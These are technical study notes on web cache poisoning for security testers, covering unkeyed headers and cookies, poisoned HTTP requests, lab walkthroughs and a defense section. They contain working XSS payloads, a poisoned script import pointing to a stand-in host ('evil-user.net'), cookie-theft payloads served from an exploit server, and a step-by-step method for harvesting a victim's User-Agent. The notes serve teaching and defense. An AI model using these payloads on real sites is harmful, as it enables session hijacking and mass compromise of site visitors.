# Web Cache Poisoning — Deep Technical Notes

> **Purpose:** Practical + theoretical understanding for security researchers and penetration testers.

---

## Table of Contents

1. [What is Web Cache Poisoning?](#1-what-is-web-cache-poisoning)
2. [How Web Caches Work (Foundation)](#2-how-web-caches-work-foundation)
3. [Core Concept: Keyed vs Unkeyed Inputs](#3-core-concept-keyed-vs-unkeyed-inputs)
4. [Attack Phases — Step by Step](#4-attack-phases--step-by-step)
5. [Attack Vectors & Exploitation Techniques](#5-attack-vectors--exploitation-techniques)
   - 5.1 [XSS via Unkeyed Header](#51-xss-via-unkeyed-header)
   - 5.2 [Malicious JS Import via Resource URL Manipulation](#52-malicious-js-import-via-resource-url-manipulation)
   - 5.3 [Cookie-Based Cache Poisoning](#53-cookie-based-cache-poisoning)
   - 5.4 [Multi-Header Exploitation](#54-multi-header-exploitation)
   - 5.5 [Targeted Poisoning Using `Vary` Header](#55-targeted-poisoning-using-vary-header)
6. [Information Leakage That Helps Attackers](#6-information-leakage-that-helps-attackers)
7. [Lab Walkthroughs (Step-by-Step)](#7-lab-walkthroughs-step-by-step)
8. [Impact Assessment](#8-impact-assessment)
9. [Defense & Prevention](#9-defense--prevention)
10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)

---

## 1. What is Web Cache Poisoning?

Web cache poisoning is an attack where an attacker **tricks a cache into storing a malicious response** and serving it to other users.

### Simple Analogy

Imagine a library (cache) that makes photocopies of popular books and hands out copies instead of the original. If an attacker sneaks in and **replaces the original with a tampered version before it gets copied**, every person who comes asking for that book gets the tampered copy — without the attacker doing anything more.

### Key Insight

- The attacker **doesn't attack victims directly**.
- The attacker poisons the **shared cache**, and the cache does the work of distributing the attack.
- This makes it **scalable** — one poisoned response can harm thousands of users.

---

## 2. How Web Caches Work (Foundation)

```
User Request
     │
     ▼
[ Cache Layer ]  ◄──── Sits between user and server
     │
     ├─── Cache HIT  → Returns stored response (no server contact)
     │
     └─── Cache MISS → Forwards to Back-end Server
                              │
                              ▼
                       Server generates response
                              │
                              ▼
                       Cache stores + returns it
```

### Why Caches Exist

- Reduce server load
- Speed up response times
- Handle traffic spikes

### Cache TTL (Time To Live)

Every cached response has an expiry time. After expiry, the cache fetches a fresh copy from the server. An attacker can **re-poison the cache** repeatedly through scripting, maintaining the attack indefinitely even with short TTLs.

---

## 3. Core Concept: Keyed vs Unkeyed Inputs

This is the **heart of the vulnerability**.

### Cache Key

A cache key is the **identifier** the cache uses to decide if two requests are "the same." Typically includes:
- Request method + path + query string (request line)
- `Host` header

```
Cache Key Example:
GET /homepage?lang=en  +  Host: example.com
```

If two requests have the same cache key → the cache serves **the same stored response** to both.

### Unkeyed Inputs

Anything **NOT in the cache key** is an unkeyed input. Common examples:

| Unkeyed Input Type | Examples |
|--------------------|----------|
| HTTP Headers | `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Host`, `X-Original-URL` |
| Cookies | Custom app cookies like `fehost`, `language` |
| Query parameters (sometimes) | Extra params the cache ignores |

### Why This Is Dangerous

The server **reads** unkeyed inputs and may use them to build responses (e.g., generate URLs, set redirect targets). But the cache **ignores** them when matching requests.

**Result:** An attacker can inject a malicious value in an unkeyed header. The server embeds it in the response. The cache stores that response. Now **all users with the same cache key get the poisoned response** — even though their requests never contained the malicious header.

---

## 4. Attack Phases — Step by Step

### Phase 1: Reconnaissance — Find Unkeyed Inputs

**Goal:** Identify which request components the server uses but the cache ignores.

**Manual Method:**
1. Send a normal request, capture the response.
2. Add random/custom headers one at a time.
3. Check if any header value **appears in the response** (reflected) or changes its behavior.
4. Compare with and without the header using Burp Comparer.

**Automated Method:**
- Use **Param Miner** (Burp Suite extension) → right-click request → "Guess headers"
- It sends hundreds of known unkeyed header combinations and reports which ones affect the response.

### Phase 2: Elicit a Harmful Response

**Goal:** Craft a request with an unkeyed input that causes the server to produce a dangerous response.

Check if the unkeyed input is:
- **Reflected** directly into the HTML/JS without sanitization → XSS possible
- **Used to construct a URL** (e.g., for a script import) → malicious resource import possible
- **Used in a redirect** → open redirect possible

### Phase 3: Get It Cached

**Goal:** Make sure the poisoned response actually gets stored in the cache.

Factors that affect caching:
- File extension (`.js`, `.css`, `.html` more likely to be cached)
- HTTP status code (200 is most likely to be cached)
- Response headers (`Cache-Control: public`, no `no-store` or `private`)
- Route/path

**Technique:**
- Use a **cache buster** (e.g., `?cb=1234`) during testing so you don't accidentally poison live cache.
- Remove the cache buster when ready to poison for real.
- Keep sending the request until you see `X-Cache: hit` in the response headers — that confirms it's cached.

---

## 5. Attack Vectors & Exploitation Techniques

### 5.1 XSS via Unkeyed Header

**Scenario:** The server reads `X-Forwarded-Host` and embeds its value in an HTML meta tag without sanitization.

**Normal request/response:**
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

**Poisoned request:**
```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

**Poisoned response (now cached):**
```html
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

**Impact:** Every user visiting `/en?region=uk` gets the XSS payload executed in their browser.

---

### 5.2 Malicious JS Import via Resource URL Manipulation

**Scenario:** The server uses `X-Forwarded-Host` to build the base URL for loading JavaScript files.

**Normal:**
```html
<script src="https://example.com/static/analytics.js"></script>
```

**Poisoned request:**
```http
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
```

**Poisoned response (cached):**
```html
<script src="https://evil-user.net/static/analytics.js"></script>
```

**What the attacker does:** Hosts a malicious `analytics.js` on their server with any payload they want (steal cookies, redirect, keylog, etc.). Every visitor executes it.

---

### 5.3 Cookie-Based Cache Poisoning

**Scenario:** A cookie value is used server-side to render content, but the cookie is NOT part of the cache key.

**Example:**
```http
GET /blog/post.php?mobile=1 HTTP/1.1
Cookie: language=pl
```

If `language` cookie is unkeyed, all users get the Polish version regardless of their own cookie.

**More dangerous variant — XSS via cookie:**
```
Cookie: fehost=someString"-alert(1)-"someString
```
If `fehost` value is reflected in a JavaScript object in the response without sanitization, this triggers XSS.

**Why this vector is less common:** Legitimate users sometimes accidentally poison the cache themselves, making the bug very visible and quick to find/fix.

---

### 5.4 Multi-Header Exploitation

**Scenario:** A single unkeyed header alone doesn't produce a harmful response, but combining two or more headers does.

**Example setup:**
- `X-Forwarded-Scheme: http` → triggers a 302 redirect to HTTPS version of the same URL
- `X-Forwarded-Host: attacker.com` → changes where the redirect points

**Alone:**
- `X-Forwarded-Scheme: http` → redirects to `https://innocent-site.com/page` (harmless)
- `X-Forwarded-Host: attacker.com` → no visible effect

**Combined:**
```http
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
```
**Poisoned redirect response:**
```
Location: https://attacker.com/page
```
Now cached → every visitor is redirected to the attacker's site.

---

### 5.5 Targeted Poisoning Using `Vary` Header

**The `Vary` header:** Tells the cache to include additional request headers in the cache key.

```
Vary: User-Agent
```

This means **different browser/device types get different cached responses**.

**How attackers use this:**
1. Discover `Vary: User-Agent` is set.
2. Identify victim's exact User-Agent by tricking them into loading an image from attacker-controlled server:
   ```html
   <!-- Posted in a comment on the target site -->
   <img src="https://attacker-server.net/foo" />
   ```
3. Read the victim's `User-Agent` from the attacker server's access log.
4. Send the poisoned request using **that exact User-Agent** value.
5. Only the victim (or users with that User-Agent) will receive the poisoned response.

**Use case:** Targeted attacks against specific users or device types.

---

## 6. Information Leakage That Helps Attackers

### Cache-Control Headers Reveal TTL

```http
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

- `max-age=1800` → cache lives for 30 minutes
- `Age: 174` → this response has been cached for 174 seconds, expires in ~26 minutes

**Attacker benefit:** Instead of brute-force spamming requests until one gets cached, the attacker can calculate **exactly when** to send the poisoned request to maximize the caching window — making the attack stealthier.

---

## 7. Lab Walkthroughs (Step-by-Step)

### Lab 1: Unkeyed Header → JS Import Poisoning

**Objective:** Poison cache to load malicious JS file via `X-Forwarded-Host`.

```
1. Load home page with Burp running.
2. Find GET request for /resources/js/tracking.js in HTTP history.
3. Send to Repeater. Add ?cb=1234 (cache buster).
4. Add header: X-Forwarded-Host: example.com
5. Observe the response reflects this host in a <script src="..."> tag.
6. On exploit server, create /resources/js/tracking.js with body: alert(document.cookie)
7. Change header to: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
8. Send until you see X-Cache: hit in response headers.
9. Remove cache buster → resend to poison real cache.
10. Keep replaying to maintain poison until victim visits.
```

---

### Lab 2: Unkeyed Cookie → XSS

**Objective:** Poison cache using a cookie value reflected in a JS object.

```
1. Load home page, find that fehost cookie is set (e.g., fehost=prod-cache-01).
2. Notice the cookie value appears inside a JS object in the response.
3. Send to Repeater. Add ?cb=1234 cache buster.
4. Modify cookie: fehost=someString"-alert(1)-"someString
5. Send request → confirm payload reflected in response.
6. Replay until X-Cache: hit.
7. Remove cache buster → resend to poison real cache.
```

---

### Lab 3: Multiple Headers → Redirect Poisoning

**Objective:** Chain X-Forwarded-Scheme + X-Forwarded-Host to poison a redirect.

```
1. Load home page, find GET for /resources/js/tracking.js.
2. Add X-Forwarded-Scheme: http → observe 302 redirect to HTTPS.
3. Add X-Forwarded-Host: example.com alongside it.
4. Observe redirect Location now points to https://example.com/...
5. On exploit server, host /resources/js/tracking.js with: alert(document.cookie)
6. Set X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
7. Keep X-Forwarded-Scheme: nothttps (anything not HTTPS triggers redirect).
8. Send until exploit URL appears in Location header and X-Cache: hit.
9. Remove cache buster → keep replaying.
```

---

### Lab 4: Targeted Attack via Unknown Header + Vary

**Objective:** Steal victim's User-Agent, then poison cache only for their browser.

```
1. Run Param Miner on home page → discovers secret header X-Host.
2. Set X-Host: example.com → observe it controls JS import URL.
3. On exploit server, host /resources/js/tracking.js with payload.
4. Set X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net → confirm X-Cache: hit.
5. Notice response has: Vary: User-Agent
6. Post comment on target site: <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
7. Watch exploit server access log → a different User-Agent will appear (victim).
8. Copy victim's User-Agent.
9. In Repeater, set that User-Agent + X-Host exploit header.
10. Remove cache buster → send until cache is poisoned for victim's UA.
```

---

## 8. Impact Assessment

| Factor | Low Impact | High Impact |
|--------|-----------|------------|
| **Payload type** | Reflected harmless content | XSS, credential theft, account takeover |
| **Page traffic** | Rarely visited page | Home page, login page |
| **Cache TTL** | Short (expires quickly) | Long + attacker re-poisons in a loop |
| **Attack scope** | Affects specific users | Affects all users globally |

### What Payloads Can Be Delivered via a Poisoned Cache?

- **XSS** — steal cookies, hijack sessions
- **Malicious JS injection** — full account takeover, keyloggers
- **Open redirects** — phishing, credential harvesting
- **CSRF setups** — trigger actions on behalf of victims
- **Defacement** — deliver false content to all users

---

## 9. Defense & Prevention

### 1. Disable Caching (If Feasible)

The only foolproof defense. Ask: do you actually need caching, or was it just the CDN default?

### 2. Restrict Caching to Truly Static Responses

Only cache files that **never change** based on user input:
- Pure static assets: CSS, fonts, images, SVGs
- **Not** HTML pages that render dynamic content

### 3. Eliminate Unnecessary Headers

If your application doesn't **need** `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Host`, etc., **disable them at the CDN/proxy level**. Never trust or reflect headers you don't use.

### 4. Never Reflect Unvalidated Input

Any input that reaches the response must be:
- **Sanitized** (HTML-encode, JS-encode)
- **Validated** against an allowlist

### 5. Avoid "Fat GET" Requests

Some frameworks accept request body in GET requests. This opens extra unkeyed input channels. Disable if unused.

### 6. Rewrite Requests Instead of Excluding Cache Keys

If a parameter must be excluded from the cache key for performance, **rewrite the request** to strip that parameter before it reaches the cache, rather than excluding it silently.

### 7. Include `Vary` for Dynamic Content

If content varies by user input (like language or device type), ensure that input IS part of the cache key via the `Vary` header. This prevents one user's poisoned response from spreading to others.

### 8. Patch Client-Side Vulnerabilities Proactively

Unexploitable client-side bugs (like DOM XSS) can become exploitable when combined with cache poisoning quirks. Patch them before an attacker finds the combination.

### 9. Audit Third-Party Technologies

CDNs and third-party integrations often support obscure headers by default. Audit what headers your entire stack supports, and disable what you don't need.

---

## 10. Quick Reference Cheat Sheet

### Signs a Site May Be Vulnerable

- Reflects `X-Forwarded-Host` or similar headers in HTML/JS
- Dynamically generates script/stylesheet URLs from request headers
- Uses cookies to control content but excludes them from cache keys
- Response headers show `Cache-Control: public` with no `Vary` on dynamic inputs
- CDN/caching layer doesn't normalize or strip custom headers

### Key HTTP Response Headers to Watch

| Header | What It Tells You |
|--------|------------------|
| `X-Cache: hit` | Response came from cache (not fresh from server) |
| `X-Cache: miss` | Cache didn't have it, fetched from server |
| `Cache-Control: public, max-age=N` | Cacheable for N seconds |
| `Age: N` | Response has been cached for N seconds |
| `Vary: User-Agent` | Cache key includes User-Agent |

### Common Unkeyed Headers to Test

```
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Scheme
X-Host
X-Original-URL
X-Rewrite-URL
X-Original-Host
Forwarded
```

### Cache Buster Technique

During testing, always add a unique query parameter to avoid poisoning the real cache:
```
GET /page?cb=randomstring123 HTTP/1.1
```
Remove it only when intentionally poisoning for the final exploit.

---
